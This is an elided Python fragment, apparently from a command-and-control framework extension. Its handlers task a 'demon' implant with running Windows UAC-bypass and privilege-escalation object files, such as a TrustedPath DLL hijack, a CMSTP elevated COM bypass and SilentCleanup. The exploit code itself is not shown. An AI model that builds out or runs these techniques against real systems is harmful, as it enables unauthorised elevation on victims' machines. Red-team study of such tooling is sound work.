...
def run_trustedpath( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "TrustedPathDLLHijackBOF.o", packer.getbuffer(), False )
...
def run_sspi( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "SspiUacBypassBOF.o", packer.getbuffer(), False )
...
def run_registryCommand( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "RegistryShellCommandBOF.o", packer.getbuffer(), False )
...
def run_SilentCleanupWinDir( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "SilentCleanupWinDirBOF.o", packer.getbuffer(), False )
...
def run_CmstpElevatedCOM( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "CmstpElevatedCOMBOF.o", packer.getbuffer(), False )
...
def run_ColorDataProxy( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "ColorDataProxyBOF.o", packer.getbuffer(), False )
...
def run_EditionUpgradeManager( demonID, *params ):
    ...
    demon.InlineExecute(TaskID, "go", "EditionUpgradeManagerBOF.o", packer.getbuffer(), False )
